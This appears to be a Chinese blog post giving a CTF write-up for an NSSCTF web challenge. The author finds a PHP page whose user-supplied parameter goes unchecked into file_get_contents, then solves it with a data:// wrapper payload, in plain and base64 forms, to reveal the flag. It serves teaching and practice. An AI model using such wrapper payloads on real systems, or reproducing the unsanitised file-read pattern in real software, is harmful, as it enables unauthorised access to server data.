<p>你看不见我但是你又能看见我，应该是被隐藏了，用dir扫一下目录</p>
<p><img src="/img/1721784913662-10.png" alt="img"></p>
<p>发现&#x2F;test.txt和&#x2F;<a target="_blank" rel="noopener" href="http://www.rar/">www.rar</a></p>
<p>先进入&#x2F;test.txt</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cxk&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$cxk</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cxk&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$cxk</span>)==<span class="string">&quot;ctrl&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;娲楁礂鐫″惂&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;nononoononoonono&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>下载rar发现</p>
<p><img src="/img/1721784913662-11.png" alt="img"></p>
<p>进入&#x2F;orzorz.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cxk&#x27;</span>]))&#123; </span><br><span class="line">    <span class="variable">$cxk</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cxk&#x27;</span>]; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$cxk</span>)==<span class="string">&quot;ctrl&quot;</span>)&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>; </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;洗洗睡吧&quot;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;nononoononoonono&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span>nononoononoonono</span><br></pre></td></tr></table></figure>

<p>和test.txt相似</p>
<p>代码分析：检查是否存在名为 ‘cxk’ 的 GET 参数，赋值给$cxk</p>
<p>使用 file_get_contents($cxk) 函数读取 $cxk 变量中指定的 URL 或文件的内容</p>
<p>如果读取的内容等于字符串 “ctrl”，则输出变量 $flag 的值</p>
<p>file_get_content()函数配合php伪协议来获取flag</p>
<p>这里采用data协议，构造payload为</p>
<p>?cxk&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,ctrl</p>
<p>?cxk&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,Y3RybA&#x3D;&#x3D;</p>
<p><img src="/img/1721784913662-12.png" alt="img"></p>
<p>NSSCTF{a1475d2b-f68b-4eb0-aa97-3d998ac90e1a}</p>

      
    </div>
    
  </div>
  
    
<nav id="article-nav">
  
  
    <a href="/2024/07/23/%E9%9A%90%E5%86%99%E4%B8%80/" id="article-nav-older" class="article-nav-link-wrap">
      <div class="article-nav-title">隐写一</div>
      <strong class="article-nav-caption">&gt;</strong>
    </a>
  
</nav>

  
</article>






</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
      <div class="footer-left">
        &copy; 2024 jothon
      </div>
        <div class="footer-right">
          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/preccrep/hexo-theme-jelly" target="_blank">Jelly</a>
        </div>
    </div>
  </div>
</footer>
    </div>
    
  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">



<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: false,
		animate: true,
		isHome: false,
		isPost: true,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>

<script src="/js/main.js"></script>




  </div>
</body>
</html>